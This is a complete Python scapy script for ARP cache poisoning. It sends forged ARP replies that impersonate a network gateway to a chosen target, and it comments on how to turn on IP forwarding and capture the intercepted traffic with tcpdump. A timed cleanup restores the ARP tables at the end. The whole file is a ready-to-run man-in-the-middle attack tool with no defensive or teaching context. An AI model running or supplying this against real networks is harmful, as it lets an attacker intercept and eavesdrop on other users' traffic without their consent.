import sys
import time
from scapy.all import ARP, Ether, srp, send # pip install scapy


# echo 0/1 | sudo tee /proc/sys/net/ipv4/ip_forward
# sudo tcpdump -i <interface> -w data.pcap


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether_frame = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_packet = ether_frame / arp_request

    try:
        resp, _ = srp(arp_packet, timeout=2, retry=10, verbose=0)
        for _, packet in resp:
            return packet[Ether].src
    except Exception as e:
        print(f'Error in get_mac: {e}')
        return None


def arp_poison(target_ip, target_mac, gateway_ip):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(arp_response, verbose=0)


def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    arp_restore = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_restore, count=5, verbose=0)


def main(target_ip, gateway_ip, poisoning_time):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(f'Failed to get target MAC address for IP {target_ip}.')
        sys.exit(1)
    if not gateway_mac:
        print(f'Failed to get gateway MAC address for IP {gateway_ip}.')
        sys.exit(1)

    try:
        print(f'Starting ARP poisoning for target IP {target_ip}...')

        start_time = time.time()

        while time.time() - start_time < poisoning_time:
            arp_poison(target_ip, target_mac, gateway_ip)
            time.sleep(2)

        print(f'ARP poisoning complete for target IP {target_ip}.')
    except KeyboardInterrupt:
        print('ARP poisoning interrupted.')
    finally:
        print(f'Restoring ARP tables for target IP {target_ip}...')
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        print(f'ARP tables restored for target IP {target_ip}.')


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Usage: python arp_poison.py target_ip gateway_ip poisoning_time')
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    try:
        poisoning_time = float(sys.argv[3])
    except ValueError:
        print('Invalid poisoning time. Please provide a valid number of seconds.')
        sys.exit(1)

    main(target_ip, gateway_ip, poisoning_time)


